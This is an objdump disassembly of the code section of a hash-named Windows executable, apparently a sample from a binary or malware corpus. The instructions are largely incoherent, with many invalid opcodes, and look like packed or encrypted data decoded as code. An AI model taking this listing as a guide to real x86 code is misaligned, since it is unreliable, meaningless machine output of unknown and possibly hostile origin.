
5b9bb7b6ea252fa11091ba9533dac5ab6866dc4392c9c283af1573175e5833d8.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	inc    eax
  411001:	adc    BYTE PTR [ecx+0x0],al
  411004:	cli    
  411005:	je     0x411007
  411007:	add    BYTE PTR [edx],bh
  411009:	test   DWORD PTR [ecx+0x0],eax
  41100c:	dec    edi
  41100d:	push   eax
  41100e:	add    DWORD PTR [eax],eax
  411010:	mov    ebp,edx
  411012:	inc    edx
  411013:	add    BYTE PTR [edi+0x2800000e],bl
  411019:	in     al,0x42
  41101b:	add    ah,dh
  41101d:	jmp    0xce5d1022
  411022:	inc    ebx
  411023:	add    BYTE PTR [edi+0x50],cl
  411026:	add    DWORD PTR [eax],eax
  411028:	add    BYTE PTR [eax+0x45],dl
  41102b:	add    BYTE PTR [ebp-0x25],dl
  41102e:	add    BYTE PTR [eax],al
  411030:	add    BYTE PTR [eax+0x46],dl
  411033:	add    BYTE PTR [edi+0xcc],dh
  411039:	add    BYTE PTR [eax],al
  41103b:	add    BYTE PTR [eax],al
  41103d:	add    BYTE PTR [eax],al
  41103f:	add    BYTE PTR [ebp-0x75],bh
  411042:	aad    0x55
  411044:	fbld   TBYTE PTR [ecx+0xd4a8ba9]
  41104a:	out    dx,al
  41104b:	jg     0x4110cc
  41104d:	popa   
  41104e:	and    al,BYTE PTR [ebx]
  411050:	xor    ebp,DWORD PTR [ebp+0x3f]
  411053:	sbb    BYTE PTR [ebp-0x5a95b817],0xfb
  41105a:	pusha  
  41105b:	push   es
  41105c:	mov    bl,0x14
  41105e:	icebp  
  41105f:	gs clc 
  411061:	cli    
  411062:	xchg   edi,eax
  411063:	adc    DWORD PTR [edi-0x51],edx
  411066:	pop    ecx
  411067:	cmp    eax,0x6138189e
  41106c:	loope  0x411023
  41106e:	fstp   QWORD PTR [ecx]
  411070:	ds nop
  411072:	shl    ch,0xf0
  411075:	pop    ds
  411076:	push   ds
  411077:	aad    0x13
  411079:	lock add eax,0x5fdc5bcc
  41107f:	push   ebx
  411080:	push   edi
  411081:	call   0xfc8500c5
  411086:	add    eax,0x22026cfa
  41108b:	jne    0x41100f
  41108d:	add    eax,0x910f7264
  411092:	pusha  
  411093:	add    eax,0x94200582
  411098:	outs   dx,BYTE PTR ds:[esi]
  411099:	cs push ds
  41109b:	aad    0x89
  41109d:	add    eax,0xe66dee34
  4110a2:	sub    esp,edi
  4110a4:	out    dx,eax
  4110a5:	popa   
  4110a6:	mov    edx,0x1fea51ed
  4110ab:	stc    
  4110ac:	popa   
  4110ad:	fidiv  DWORD PTR [edi]
  4110af:	cld    
  4110b0:	aad    0xdd
  4110b2:	aaa    
  4110b3:	cld    
  4110b4:	mov    BYTE PTR [ebx+0x7c49fc75],bh
  4110ba:	sahf   
  4110bb:	mov    ds:0x3e741223,al
  4110c0:	xchg   ecx,eax
  4110c1:	(bad)  
  4110c2:	out    dx,eax
  4110c3:	into   
  4110c4:	pushf  
  4110c5:	das    
  4110c6:	adc    edi,DWORD PTR [ebx+0x63]
  4110c9:	or     dh,bh
  4110cb:	mov    ds:0xcaf26d16,eax
  4110d0:	sub    DWORD PTR [edi+0x62],edi
  4110d3:	push   ecx
  4110d4:	out    dx,al
  4110d5:	adc    al,al
  4110d7:	in     al,0x6e
  4110d9:	sbb    BYTE PTR [eax+0x39728e95],cl
  4110df:	fistp  DWORD PTR [esi]
  4110e1:	stc    
  4110e2:	add    eax,0xc0f55113
  4110e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110e8:	add    DWORD PTR [edx+0x56],ebx
  4110eb:	pop    ss
  4110ec:	sbb    bl,BYTE PTR [edi+0x2c23d570]
  4110f2:	aaa    
  4110f3:	rol    DWORD PTR [eax],1
  4110f5:	repz sbb al,0xd5
  4110f8:	ja     0x4110bd
  4110fa:	in     eax,dx
  4110fb:	scas   al,BYTE PTR es:[edi]
  4110fc:	js     0x411105
  4110fe:	push   ds
  4110ff:	aad    0x88
  411101:	add    eax,0x88ed51e
  411106:	outs   dx,DWORD PTR ds:[esi]
  411107:	aad    0x96
  411109:	sbb    eax,0x589d4ad
  41110e:	je     0x4110de
  411110:	cwde   
  411111:	sub    ebx,DWORD PTR [ecx+0x1e0576d4]
  411117:	inc    ecx
  411118:	mov    BYTE PTR [ebx],al
  41111a:	push   ds
  41111b:	aad    0xd1
  41111d:	mov    ah,cl
  41111f:	icebp  
  411120:	test   DWORD PTR [ebp+0x6d8ccbd3],ecx
  411126:	fisub  WORD PTR [eax-0x64]
  411129:	test   DWORD PTR [eax],ecx
  41112b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41112c:	sbb    esp,DWORD PTR [esi+eiz*2]
  41112f:	ror    BYTE PTR [eax+0x46e31e05],1
  411135:	sub    DWORD PTR [ecx+0x1e0577d4],ecx
  41113b:	jge    0x4111b1
  41113d:	sbb    eax,0xfc64d11d
  411142:	xor    edx,esp
  411144:	and    al,0xd2
  411146:	fidiv  DWORD PTR ss:[edi+0x5]
  41114a:	jb     0x4110fa
  41114c:	jo     0x411155
  41114e:	push   ds
  41114f:	aad    0x41
  411151:	sub    al,0x49
  411153:	jne    0x4110de
  411155:	add    eax,0x2a2da31e
  41115a:	je     0x41118c
  41115c:	nop
  41115d:	das    
  41115e:	shl    edx,cl
  411160:	test   DWORD PTR [edi],ebp
  411162:	inc    ebx
  411163:	inc    ebx
  411164:	das    
  411165:	sti    
  411166:	sti    
  411167:	mov    ds:0x5e78626c,eax
  41116c:	mov    BYTE PTR [edi],al
  41116e:	push   ds
  41116f:	aad    0xfa
  411171:	add    ah,BYTE PTR [eax-0x2b]
  411174:	mov    DWORD PTR [edi],ebp
  411176:	or     cl,bh
  411178:	pop    ecx
  411179:	xlat   BYTE PTR ds:[ebx]
  41117a:	mov    ecx,0x6bfe0b5c
  41117f:	pop    ebp
  411180:	cmp    eax,0x487d63f4
  411185:	outs   dx,DWORD PTR ds:[esi]
  411186:	jae    0x4111dd
  411188:	popa   
  411189:	sbb    al,dh
  41118b:	int    0x21
  41118d:	in     eax,dx
  41118e:	xor    al,0xb9
  411190:	loop   0x411194
  411192:	sbb    al,0xd5
  411194:	ja     0x411203
  411196:	sbb    ch,BYTE PTR [ebp+0x2e0a0176]
  41119c:	pop    esp
  41119d:	add    cl,dl
  41119f:	in     eax,0xaa
  4111a1:	pop    es
  4111a2:	push   ds
  4111a3:	aad    0xfe
  4111a5:	sbb    edx,DWORD PTR [edi]
  4111a7:	(bad)  [esi+0x5]
  4111aa:	or     cl,BYTE PTR [esi-0x61]
  4111ad:	sahf   
  4111ae:	dec    edi
  4111af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111b0:	xor    dl,0x1c
  4111b3:	aad    0x77
  4111b5:	shl    DWORD PTR [ebp-0x52],0x78
  4111b9:	pop    es
  4111ba:	push   ds
  4111bb:	aad    0x1a
  4111bd:	lahf   
  4111be:	push   0x372c23d5
  4111c3:	dec    ebp
  4111c4:	or     ebx,eax
  4111c6:	xchg   ecx,eax
  4111c7:	das    
  4111c8:	cdq    
  4111c9:	std    
  4111ca:	repz mov ds:0x3641233,eax
  4111d0:	icebp  
  4111d1:	das    
  4111d2:	aad    0xc5
  4111d4:	(bad)  
  4111d5:	retf   
  4111d6:	outs   dx,DWORD PTR ds:[esi]
  4111d7:	mov    ds:0xcf64426f,eax
  4111dc:	cdq    
  4111dd:	jg     0x4111a1
  4111df:	inc    edx
  4111e0:	das    
  4111e1:	xor    al,BYTE PTR [esi+esi*2]
  4111e4:	rcr    BYTE PTR [eax+ebp*8],cl
  4111e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111e8:	pop    esp
  4111e9:	add    bh,dh
  4111eb:	in     eax,0x2
  4111ed:	pop    es
  4111ee:	push   ds
  4111ef:	aad    0xfb
  4111f1:	fwait
  4111f2:	ja     0x4111c1
  4111f4:	mov    es,WORD PTR [ecx-0x20d41acb]
  4111fa:	xor    ax,ax
  4111fd:	pop    ds
  4111fe:	enter  0x96a5,0x77
  411202:	arpl   WORD PTR [edi+0x49],dx
  411205:	pop    ds
  411206:	fs push ebx
  411208:	mov    al,0x1f
  41120a:	call   0x6443b1b4
  41120f:	das    
  411210:	cdq    
  411211:	adc    esp,edi
  411213:	ins    DWORD PTR es:[edi],dx
  411214:	mov    al,0xc3
  411216:	icebp  
  411217:	push   eax
  411218:	cdq    
  411219:	add    eax,0x550a3c8
  41121e:	or     bh,BYTE PTR [esi+esi*2-0x471a9007]
  411225:	add    al,0x1e
  411227:	aad    0x1b
  411229:	adc    eax,0x9a866d67
  41122e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41122f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411230:	or     eax,0x9e0f1e1b
  411235:	jmp    0xd72f:0xc3502c66
  41123c:	mov    DWORD PTR ds:0x5dd0d71e,eax
  411242:	inc    edx
  411243:	mov    dl,0x9
  411245:	add    dl,ah
  411247:	mov    edi,0x5542068f
  41124c:	mov    DWORD PTR [ebp+0x575992f],esp
  411252:	push   ds
  411253:	mov    eax,ds:0xa300a02
  411258:	push   0x63db8d5a
  41125d:	or     dh,BYTE PTR [eax]
  41125f:	sbb    DWORD PTR [edi+0x5],esi
  411262:	push   ds
  411263:	mov    eax,ds:0x2030f203
  411268:	stos   BYTE PTR es:[edi],al
  411269:	xor    al,0xd
  41126b:	aad    0x63
  41126d:	or     dh,BYTE PTR [eax]
  41126f:	cmp    DWORD PTR [edi+0x5],esi
  411272:	push   ds
  411273:	mov    eax,ds:0x2e76fa03
  411278:	jno    0x411297
  41127a:	sahf   
  41127b:	pop    ebp
  41127c:	xchg   esi,eax
  41127d:	ja     0x41127e
  41127f:	lea    edx,[edx-0x617a9c66]
  411285:	mov    ds:0xa23d377,al
  41128a:	jb     0x41129a
  41128c:	push   0x9bb5fe1d
  411291:	mov    eax,0xea73bd37
  411296:	jbe    0x411266
  411298:	imul   ecx,DWORD PTR [ebp+0x6a42cf0d],0xf462e597
  4112a2:	jbe    0x41124c
  4112a4:	xchg   edx,eax
  4112a5:	call   0xc90f:0x9bffadbf
  4112ac:	push   eax
  4112ad:	jno    0x41130e
  4112af:	aad    0x89
  4112b1:	add    eax,0xaf730878
  4112b6:	sub    edx,esi
  4112b8:	std    
  4112b9:	shl    DWORD PTR [ecx-0x33],1
  4112bc:	add    cl,0xc
  4112bf:	std    
  4112c0:	cmp    DWORD PTR [edi-0x6a6bfe1],ebp
  4112c6:	dec    edi
  4112c7:	mov    ds:0x3c78001d,eax
  4112cc:	stos   DWORD PTR es:[edi],eax
  4112cd:	sbb    edx,DWORD PTR [edi+edi*1+0x4377ff69]
  4112d4:	adc    ch,dl
  4112d6:	push   es
  4112d7:	stos   BYTE PTR es:[edi],al
  4112d8:	jmp    FWORD PTR [ebx-0x107230f9]
  4112de:	xchg   esp,eax
  4112df:	(bad)  
  4112e0:	std    
  4112e1:	and    eax,0xfaa9b47f
  4112e6:	dec    ebx
  4112e7:	mov    ds:0xf73e5b8c,eax
  4112ec:	imul   esp,ebx,0xa229359a
  4112f2:	dec    edi
  4112f4:	test   BYTE PTR ds:0xfb5ed813,al
  4112fa:	imul   esp,ebx,0xace31d00
  411300:	jbe    0x4112c1
  411302:	and    ah,BYTE PTR [esi]
  411304:	or     eax,0x9f0f1e1b
  411309:	jmp    0xde74:0x2a63a220
  411310:	cdq    
  411311:	or     eax,0xcfeed484
  411316:	test   al,0x72
  411318:	mov    ebp,ss
  41131a:	cmp    dl,ah
  41131c:	mov    BYTE PTR ds:0x93efc804,al
  411322:	xor    bh,ch
  411324:	mov    DWORD PTR ds:0x7fb0f31e,eax
  41132a:	sahf   
  41132b:	in     al,0x3e
  41132d:	add    bl,BYTE PTR [esi]
  41132f:	aad    0x6e
  411331:	pop    esp
  411332:	test   al,dl
  411334:	or     ah,BYTE PTR [edx+0x7f]
  411337:	in     eax,0x16
  411339:	add    bl,BYTE PTR [esi]
  41133b:	aad    0xac
  41133d:	test   DWORD PTR [esi],eax
  41133f:	retf   0x8462
  411342:	mov    bl,0xe2
  411344:	and    bl,dl
  411346:	cli    
  411347:	aad    0x88
  411349:	add    eax,0x226323b4
  41134e:	cs push ebx
  411350:	mov    BYTE PTR ds:0x6dd8e31e,al
  411356:	shl    esp,0x60
  411359:	test   al,0x45
  41135b:	daa    
  41135c:	pop    edi
  41135d:	dec    ebx
  41135e:	inc    eax
  41135f:	and    al,0xa
  411361:	ret    
  411362:	jo     0x4113e1
  411364:	pop    eax
  411365:	imul   ebx,DWORD PTR [esi],0xffffffd5
  411368:	mov    DWORD PTR [ebx+0x588df1f],ecx
  41136e:	add    al,0xa0
  411370:	mov    DWORD PTR [edx],ecx
  411372:	push   0xfffffff3
  411374:	test   DWORD PTR [edi],ebx
  411376:	pmullw mm4,QWORD PTR [edi+0x1e]
  41137a:	loopne 0x4113d3
  41137c:	mov    ds:0x8a72e92c,al
  411381:	mov    ecx,0xe5deca75
  411386:	push   es
  411387:	outs   dx,DWORD PTR ds:[esi]
  411388:	xor    al,0xec
  41138a:	jl     0x41135c
  41138c:	sub    eax,0xa4a169f9
  411391:	cdq    
  411392:	inc    ebx
  411393:	xor    DWORD PTR [edi],ecx
  411395:	jge    0x411387
  411397:	push   esi
  411398:	pop    eax
  411399:	out    0x1e,eax
  41139b:	aad    0x76
  41139d:	cmp    eax,0x546e4f0
  4113a2:	push   ds
  4113a3:	aad    0x6d
  4113a5:	(bad)  
  4113a6:	out    0x62,al
  4113a8:	jno    0x411404
  4113aa:	scas   al,BYTE PTR es:[edi]
  4113ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113ac:	jno    0x411408
  4113ae:	push   esi
  4113af:	pop    ss
  4113b0:	sbb    bl,BYTE PTR [edi+0x2c23d570]
  4113b6:	aaa    
  4113b7:	lods   eax,DWORD PTR ds:[esi]
  4113b8:	add    ebx,esp
  4113ba:	and    BYTE PTR [edx-0x2a57edfe],ah
  4113c0:	imul   eax,DWORD PTR ds:0x728beb1e,0x3c6301f8
  4113ca:	je     0x411400
  4113cc:	lock add edx,DWORD PTR [ebx]
  4113cf:	xlat   BYTE PTR ds:[ebx]
  4113d0:	test   eax,0x99f31e05
  4113d5:	fldenv [ecx+0x5c]
  4113d8:	lea    esp,[ebp+0x6b86cde9]
  4113de:	push   ds
  4113df:	mov    ch,0x88
  4113e1:	add    eax,0x989a1534
  4113e6:	outs   dx,DWORD PTR ds:[esi]
  4113e7:	in     eax,0x88
  4113e9:	add    eax,0x6a8bd51e
  4113ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113ef:	pop    ebx
  4113f0:	mov    ds:0x92031f85,eax
  4113f5:	sbb    al,0x1
  4113f7:	mov    cl,0x8
  4113f9:	add    bh,dh
  4113fb:	in     eax,0x68
  4113fd:	or     ebx,DWORD PTR [esi]
  4113ff:	aad    0x9a
  411401:	cwde   
  411402:	aas    
  411403:	inc    ecx
  411404:	fcomp  DWORD PTR [ecx]
  411406:	push   ds
  411407:	aad    0x8e
  411409:	das    
  41140a:	fnstenv [esi+0x3e700209]
  411410:	jns    0x411401
  411412:	lahf   
  411413:	in     eax,0x88
  411415:	gs push ds
  411417:	aad    0x2b
  411419:	out    dx,al
  41141a:	pop    ds
  41141b:	in     eax,0x1c
  41141d:	sub    dl,bh
  41141f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411420:	jbe    0x41141b
  411422:	aas    
  411423:	out    0x6c,eax
  411425:	or     DWORD PTR [esi],ebx
  411427:	aad    0x9b
  411429:	cwde   
  41142a:	pop    ss
  41142b:	mov    ecx,0x554282ef
  411430:	mov    BYTE PTR [edi],ch
  411432:	sbb    esp,ebx
  411434:	sahf   
  411435:	test   al,0xf
  411437:	lods   eax,DWORD PTR ds:[esi]
  411438:	ss ins DWORD PTR es:[edi],dx
  41143a:	(bad)  
  41143c:	shr    DWORD PTR [eax],0x65
  41143f:	test   BYTE PTR [edx+0x48db1f85],ah
  411445:	sub    DWORD PTR [ebp+0x1f85a6e4],eax
  41144b:	fucomi st,st(7)
  41144d:	enter  0x5542,0x89
  411451:	mov    ecx,0x5711b2f
  411456:	push   ds
  411457:	pop    ebp
  411458:	pop    eax
  41145a:	inc    edx
  41145b:	push   ebp
  41145c:	mov    BYTE PTR [edi],ah
  41145e:	push   0x1e058c92
  411463:	fucomi st,st(7)
  411465:	fadd   DWORD PTR [edx+0x55]
  411468:	mov    ecx,edx
  41146a:	lahf   
  41146b:	in     eax,0xeb
  41146d:	std    
  41146e:	xchg   edi,eax
  41146f:	fidiv  DWORD PTR [esi-0x7]
  411472:	aas    
  411473:	out    0xcc,eax
  411475:	or     BYTE PTR [esi],bl
  411477:	aad    0x9a
  411479:	cwde   
  41147a:	pop    es
  41147b:	mov    ebp,0xd2662508
  411480:	lea    eax,ds:0xb778a31e
  411486:	int    0xe5
  411488:	jle    0x411490
  41148a:	push   ds
  41148b:	aad    0xfe
  41148d:	pop    ds
  41148e:	sub    DWORD PTR [ecx-0x5083fdf7],esi
  411494:	push   esp
  411495:	add    DWORD PTR [esi],ebx
  411497:	aad    0x28
  411499:	mov    ah,0x2f
  41149b:	mov    esi,DWORD PTR [ecx+0x5]
  41149e:	push   ds
  41149f:	pop    ebp
  4114a0:	(bad)  
  4114a1:	rol    BYTE PTR [edx+0x55],1
  4114a4:	mov    BYTE PTR [edi],ah
  4114a6:	push   0x1e058b02
  4114ab:	mov    ds:0xde741263,eax
  4114b0:	pusha  
  4114b1:	jno    0x41144a
  4114b3:	aad    0x88
  4114b5:	add    eax,0xe1fabd90
  4114ba:	arpl   bx,si
  4114bc:	shr    BYTE PTR [ecx+ecx*1],0xa4
  4114c0:	sahf   
  4114c1:	or     BYTE PTR [edi],al
  4114c3:	lods   eax,DWORD PTR ds:[esi]
  4114c4:	ja     0x411450
  4114c6:	gs leave 
  4114c8:	icebp  
  4114c9:	fnstenv [ebp+0x28]
  4114cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114cd:	fnstenv [ecx+0x2a]
  4114d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114d1:	das    
  4114d2:	stc    
  4114d3:	int    0x8f
  4114d5:	xchg   ebx,eax
  4114d6:	xchg   edi,eax
  4114d7:	loope  0x411462
  4114d9:	mov    ebp,0xe1765433
  4114de:	(bad)  
  4114df:	(bad)  [ebx+0x12]
  4114e2:	cs jp  0x41153b
  4114e5:	push   ss
  4114e6:	jle    0x4114c3
  4114e8:	arpl   dx,sp
  4114ea:	xor    BYTE PTR [ebp+0x73],bh
  4114ed:	add    eax,0x89f071e
  4114f2:	outs   dx,DWORD PTR ds:[esi]
  4114f3:	mov    ds:0x3876fa62,eax
  4114f8:	(bad)
  4114fc:	sbb    bh,BYTE PTR [edx-0x376190fb]
  411502:	outs   dx,DWORD PTR ds:[esi]
  411503:	sar    DWORD PTR [esi],cl
  411505:	mov    bh,BYTE PTR [ebp+0x4b]
  411508:	push   ds
  411509:	push   ss
  41150a:	jl     0x411557
  41150c:	outs   dx,DWORD PTR ds:[esi]
  41150d:	cmp    bh,BYTE PTR [eax-0x34]
  411510:	mov    ch,0x35
  411512:	retf   0x9e37
  411515:	or     BYTE PTR [edi-0x2d],ch
  411518:	jne    0x411544
  41151a:	je     0x411554
  41151c:	cdq    
  41151d:	das    
  41151e:	in     eax,0x45
  411520:	sbb    BYTE PTR [esi+ebp*8],bl
  411523:	retf   0x5d28
  411526:	out    dx,al
  411527:	push   esi
  411528:	pop    edx
  411529:	pop    ds
  41152a:	test   BYTE PTR [ebp+0x6f],dl
  41152d:	ins    DWORD PTR es:[edi],dx
  41152e:	jne    0x411568
  411530:	test   al,0x2f
  411532:	sbb    edi,DWORD PTR [esi+ebx*4+0x63d347f6]
  411539:	cli    
  41153a:	data16 fistp WORD PTR [ecx+0x3506a8ff]
  411541:	sbb    al,0xeb
  411543:	fs dec ebp
  411545:	stos   DWORD PTR es:[edi],eax
  411546:	push   ds
  411547:	leave  
  411548:	pusha  
  411549:	rcr    DWORD PTR [ecx-0x68],cl
  41154c:	pop    edi
  41154d:	fcomp  QWORD PTR ds:0xe8d368c9
  411553:	fdiv   QWORD PTR [edi+0x5]
  411556:	jbe    0x4114fa
  411558:	add    BYTE PTR [edx],0x1e
  41155b:	aad    0x4f
  41155d:	in     eax,dx
  41155e:	jne    0x4114e2
  411560:	mov    BYTE PTR [edx],al
  411562:	push   ds
  411563:	aad    0x8f
  411565:	retf   
  411566:	outs   dx,DWORD PTR ds:[esi]
  411567:	mov    ds:0xc9742a6e,eax
  41156c:	popa   
  41156d:	int3   
  41156e:	gs iret 
  411570:	cdq    
  411571:	mov    ecx,0x57ec12f
  411576:	push   ds
  411577:	mov    ebp,0x943f909
  41157c:	pop    eax
  41157d:	sub    BYTE PTR [ecx+0xa07f656],bl
  411583:	hlt    
  411584:	pop    eax
  411585:	and    DWORD PTR [edi],edx
  411587:	aad    0x77
  411589:	sub    eax,0x2fe7cc9e
  41158e:	jmp    DWORD PTR [edx+0x7274227f]
  411594:	sahf   
  411595:	stc    
  411596:	or     dl,al
  411598:	lahf   
  411599:	hlt    
  41159a:	iretw  
  41159c:	cwde   
  41159d:	pop    ds
  41159e:	sbb    BYTE PTR [ebx+edx*8-0x493361d4],ah
  4115a5:	daa    
  4115a6:	xchg   edx,eax
  4115a7:	hlt    
  4115a8:	mov    dh,0xe1
  4115aa:	imul   edx,ebx,0x559e1203
  4115b0:	sub    eax,0x76e5c3a2
  4115b5:	inc    ebp
  4115b6:	push   ss
  4115b7:	es jbe 0x4115b3
  4115ba:	aas    
  4115bb:	out    0x3c,eax
  4115bd:	or     bl,BYTE PTR [esi]
  4115bf:	aad    0x3c
  4115c1:	ins    BYTE PTR es:[edi],dx
  4115c2:	xor    eax,0x489c8e1f
  4115c7:	jecxz  0x41157d
  4115c9:	sub    al,0xc9
  4115cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115cc:	sahf   
  4115cd:	enter  0xd36f,0x3f
  4115d1:	mov    dh,BYTE PTR [ebp-0x21ecd]
  4115d7:	jmp    0x88668772
  4115dc:	mov    ecx,esp
  4115de:	out    dx,eax
  4115df:	sar    esi,cl
  4115e1:	pop    edx
  4115e2:	pop    ds
  4115e3:	aad    0x89
  4115e5:	add    eax,0xf89e5a06
  4115ea:	outs   dx,DWORD PTR ds:[esi]
  4115eb:	shr    esi,cl
  4115ed:	inc    edx
  4115ee:	pop    ds
  4115ef:	aad    0x88
  4115f1:	das    
  4115f2:	fwait
  4115f3:	shl    DWORD PTR [ebx+0x12],cl
  4115f6:	je     0x411630
  4115f8:	sbb    BYTE PTR [edi],0x31
  4115fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115fc:	sub    edx,ecx
  4115fe:	es shr BYTE PTR gs:[eax+0x2b],cl
  411603:	jle    0x41164a
  411605:	push   eax
  411606:	pop    ds
  411607:	jne    0x411669
  411609:	adc    ch,BYTE PTR [eax+0x1e0596db]
  41160f:	xlat   BYTE PTR ds:[ebx]
  411610:	mov    al,ds:0x9efb2275
  411615:	cwde   
  411616:	outs   dx,DWORD PTR ds:[esi]
  411617:	ror    DWORD PTR [esi-0x772ae0be],cl
  41161d:	pop    ds
  41161e:	fs ins BYTE PTR es:[edi],dx
  411620:	mov    DWORD PTR ds:0xff69431e,eax
  411626:	repz mov ds:0xd5609a9e,al
  41162c:	mov    bh,bl
  41162e:	jo     0x41160b
  411630:	bound  edx,QWORD PTR [edx]
  411632:	fistp  QWORD PTR cs:[edi+0x5]
  411636:	push   ds
  411637:	out    dx,eax
  411638:	retf   0x1e62
  41163b:	aad    0x88
  41163d:	das    
  41163e:	lahf   
  41163f:	mov    ebp,0xa377829f
  411644:	sbb    DWORD PTR [edx],esi
  411646:	je     0x411656
  411648:	cwde   
  411649:	jae    0x411649
  41164b:	test   DWORD PTR [eax+0x10],esp
  41164e:	je     0x411624
  411650:	sti    
  411651:	xchg   ebp,eax
  411652:	dec    edi
  411653:	iret   
  411654:	popa   
  411655:	in     eax,dx
  411656:	mov    esi,0x64521fa3
  41165b:	aas    
  41165c:	cwde   
  41165d:	adc    ebp,edi
  41165f:	popf   
  411660:	call   0x6042:0x82b67a8
  411667:	aad    0x88
  411669:	add    eax,0x360eca2a
  41166e:	push   ds
  41166f:	xchg   ebp,eax
  411670:	arpl   WORD PTR [esp+ebp*8],dx
  411673:	cs test al,0x5
  411676:	push   ds
  411677:	aad    0x89
  411679:	xchg   edi,eax
  41167a:	call   0x1e46c6ec
  41167f:	aad    0x88
  411681:	ret    
  411682:	icebp  
  411683:	push   eax
  411684:	add    BYTE PTR ds:0xaa58d432,0x4e
  41168b:	mov    ah,0xc2
  41168d:	pop    es
  41168e:	or     dh,ah
  411690:	pop    eax
  411691:	sbb    DWORD PTR ds:0x8fa977d5,edx
  411697:	add    DWORD PTR [ecx-0x72169b8e],ebp
  41169d:	sbb    eax,0x176f770
  4116a2:	(bad)  
  4116a3:	push   eax
  4116a4:	stos   BYTE PTR es:[edi],al
  4116a5:	add    BYTE PTR [esi+0x1099a251],bl
  4116ab:	mov    eax,ds:0x415c29b0
  4116b0:	js     0x4116b5
  4116b2:	xchg   BYTE PTR [esi-0x2971beee],ah
  4116b8:	adc    DWORD PTR [edx-0x2fa7f28c],eax
  4116be:	add    eax,0x3e59594
  4116c3:	cli    
  4116c4:	inc    edi
  4116c5:	aam    0x21
  4116c7:	inc    BYTE PTR [edi-0x49061224]
  4116cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116ce:	pop    es
  4116cf:	jmp    0xc463:0x3abdd84c
  4116d6:	dec    edi
  4116d7:	out    0x85,al
  4116d9:	popf   
  4116da:	std    
  4116db:	fldcw  WORD PTR [edi]
  4116dd:	sbb    al,0x38
  4116df:	cli    
  4116e0:	inc    eax
  4116e1:	fdivr  DWORD PTR [ebx-0x59d16441]
  4116e7:	cmp    eax,0x87601401
  4116ec:	jo     0x41169f
  4116ee:	in     eax,0xc5
  4116f0:	lods   al,BYTE PTR ds:[esi]
  4116f1:	cs into 
  4116f3:	lods   eax,DWORD PTR ds:[esi]
  4116f4:	cmp    BYTE PTR [esi-0x382243d7],al
  4116fa:	outs   dx,DWORD PTR ds:[esi]
  4116fb:	(bad)  
  4116fd:	lahf   
  4116fe:	jecxz  0x411758
  411700:	cli    
  411701:	inc    ecx
  411702:	cs xchg esp,eax
  411704:	shr    DWORD PTR [ecx],1
  411706:	out    0x29,eax
  411708:	sbb    al,0x7a
  41170a:	push   ds
  41170b:	mov    dh,0x98
  41170d:	stos   DWORD PTR es:[edi],eax
  41170e:	outs   dx,DWORD PTR ds:[esi]
  41170f:	xlat   BYTE PTR ds:[ebx]
  411710:	stc    
  411711:	aas    
  411712:	xchg   BYTE PTR [ebx-0x5aefacb5],dh
  411718:	test   eax,0x3d4d087
  41171d:	test   eax,0x11f275fd
  411722:	outs   dx,DWORD PTR ds:[esi]
  411723:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411724:	dec    DWORD PTR [edx]
  411726:	in     eax,0x51
  411728:	retf   
  411729:	daa    
  41172a:	bound  esi,QWORD PTR [eax]
  41172c:	pop    ebx
  41172d:	fsubr  QWORD PTR [edi]
  41172f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411730:	dec    ecx
  411731:	mov    al,al
  411733:	xor    eax,0xd7f70202
  411738:	push   0x60cb721e
  41173d:	jecxz  0x41173c
  41173f:	lea    eax,[eax]
  411741:	ret    
  411742:	bound  esp,QWORD PTR [eax-0x4b0bd076]
  411748:	push   es
  411749:	loop   0x4117b3
  41174b:	pop    DWORD PTR [edi+edx*1+0x46]
  41174f:	xchg   DWORD PTR [edx+0xdb5768b],ebp
  411755:	pop    ebx
  411756:	push   0xe82a0a21
  41175b:	rcl    DWORD PTR [ebx-0x62a89fd7],1
  411761:	adc    eax,0x2a896c3e
  411766:	call   0x6a31aa82
  41176b:	sub    esi,DWORD PTR [esi-0x7403915]
  411771:	xor    ebp,DWORD PTR [esi+0x67]
  411774:	xchg   esi,eax
  411775:	lea    esp,ds:0xdffc5bcf
  41177b:	mov    bh,0x7a
  41177d:	xor    bl,BYTE PTR [esi-0x4b]
  411780:	pop    ss
  411781:	nop
  411782:	and    DWORD PTR [ebx],eax
  411784:	mov    cl,BYTE PTR ds:0xd8609dbc
  41178a:	(bad)  
  41178c:	xchg   ebx,eax
  41178d:	cmp    BYTE PTR [edi-0x49],dh
  411790:	or     DWORD PTR [esi],0x68
  411793:	dec    edi
  411794:	stc    
  411795:	push   ds
  411796:	jle    0x4117eb
  411798:	in     al,dx
  411799:	mov    ebp,0x421aa1fb
  41179e:	je     0x411759
  4117a0:	aad    0xe1
  4117a2:	add    eax,0x48284f20
  4117a7:	adc    eax,0x1414ac1
  4117ac:	stos   BYTE PTR es:[edi],al
  4117ad:	or     DWORD PTR [eax+0x4d],ebp
  4117b0:	mov    al,0x55
  4117b2:	mov    ah,0xd7
  4117b4:	jbe    0x411768
  4117b6:	div    BYTE PTR [edx]
  4117b8:	imul   ebp,DWORD PTR [esi+esi*8],0xb4859d7b
  4117bf:	xchg   ecx,eax
  4117c0:	cmp    al,0xe1
  4117c2:	sub    edx,esp
  4117c4:	ja     0x41182f
  4117c6:	pop    edx
  4117c7:	stos   BYTE PTR es:[edi],al
  4117c8:	sub    al,ch
  4117ca:	mov    ebp,fs
  4117cc:	mov    bh,0x3f
  4117ce:	xchg   BYTE PTR [esi+0x664bf7],cl
  4117d4:	or     BYTE PTR [ecx-0x73],ah
